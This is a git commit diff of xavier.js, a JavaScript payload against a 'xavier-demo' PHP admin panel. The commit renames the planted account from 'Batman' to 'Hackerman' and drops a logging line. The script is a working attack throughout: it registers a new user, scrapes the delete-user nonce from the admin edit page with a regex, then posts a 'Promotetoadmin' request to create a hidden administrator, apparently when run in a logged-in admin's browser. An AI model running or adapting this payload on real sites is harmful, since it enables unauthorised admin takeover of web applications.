b1cebacdfd90190e56c34b8d743ba77b471226b7
mqt <maxim@ingredous.com>
2019-07-21 12:20:37 -0700

    abc

--- xavier.js
+++ xavier.js
@@ -1,12 +1,11 @@
-
 var root = ""
 var req = new XMLHttpRequest();
 var url = root + "/xavier-demo/admin/includes/adminprocess.php"
-var params = "user=Batman&firstname=Batman&lastname=Batman&pass=SupermanSuperman&conf_pass=SupermanSuperman&email=Batman%40Superman.com&conf_email=Batman%40Superman.com&form_submission=admin_registration"
+var params = "user=Hackerman&firstname=Hackerman&lastname=Hackerman&pass=SupermanSuperman&conf_pass=SupermanSuperman&email=Hackerman%40Superman.com&conf_email=Hackerman%40Superman.com&form_submission=admin_registration"
 req.open("POST", url, true);
 req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req.send(params);
-var url2 = root + "/xavier-demo/admin/adminuseredit.php?usertoedit=Batman";
+var url2 = root + "/xavier-demo/admin/adminuseredit.php?usertoedit=Hackerman";
 var regex = /delete-user" value="([^"]*?)"/g;
 var req2 = new XMLHttpRequest();
 req2.open("GET", url2, false);
@@ -14,8 +13,7 @@ req2.send();
 var nonce = regex.exec(req2.responseText);
 var nonce = nonce[1];
 var url3 = root + "/xavier-demo/admin/includes/adminprocess.php";
-var params2 = "delete-user="+nonce+"&form_submission=delete_user&usertoedit=Batman&button=Promotetoadmin"
+var params2 = "delete-user="+nonce+"&form_submission=delete_user&usertoedit=Hackerman&button=Promotetoadmin"
 req2.open("POST", url3, true);
 req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req2.send(params2);
-console.log(nonce);
